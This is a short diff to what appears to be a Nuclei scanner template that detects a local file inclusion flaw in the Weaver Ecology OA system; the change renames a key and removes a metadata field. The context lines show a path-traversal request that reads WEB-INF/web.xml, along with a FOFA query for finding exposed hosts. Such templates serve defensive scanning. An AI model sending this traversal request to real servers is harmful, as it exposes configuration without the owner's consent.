@@ -6,7 +6,6 @@ info:
   severity: high
   description: Ecology is vulnerable to local file inclusion.
   metadata:
-    max-request: 1
     fofa-query: app="泛微-协同办公OA"
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
@@ -14,7 +13,7 @@ info:
     cwe-id: CWE-22
   tags: ecology,lfi
 
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml"
